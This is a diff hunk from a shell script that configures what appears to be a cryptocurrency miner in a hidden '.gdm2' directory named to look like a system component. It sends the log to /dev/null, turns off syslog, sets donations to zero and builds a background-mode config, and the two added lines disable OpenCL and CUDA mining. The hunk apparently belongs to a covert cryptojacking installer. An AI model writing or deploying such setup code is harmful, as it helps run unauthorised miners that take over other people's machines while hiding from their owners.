@@ -351,6 +351,8 @@ sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm2/config.jso
 sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
 sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
+sed -i 's/"opencl": *[^,]*,/"opencl": false,/' $HOME/.gdm2/config.json
+sed -i 's/"cuda": *[^,]*,/"cuda": false,/' $HOME/.gdm2/config.json
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
